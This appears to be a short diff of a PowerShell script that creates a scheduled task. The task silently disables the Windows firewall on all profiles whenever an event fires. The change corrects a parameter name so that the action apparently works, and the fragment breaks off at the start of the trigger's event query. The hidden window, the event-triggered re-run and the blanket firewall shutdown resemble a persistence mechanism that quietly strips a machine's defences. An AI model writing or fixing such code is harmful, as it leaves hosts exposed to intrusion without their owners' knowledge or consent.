@@ -1,4 +1,4 @@
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -Command `"Set-NetFirewallProfile Domain,Public,Private -Enabled False`""
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -Command `"Set-NetFirewallProfile Domain,Public,Private -Enabled False`""
 
 $trigger = New-ScheduledTaskTrigger -OnEvent -Subscription @"
 <QueryList>
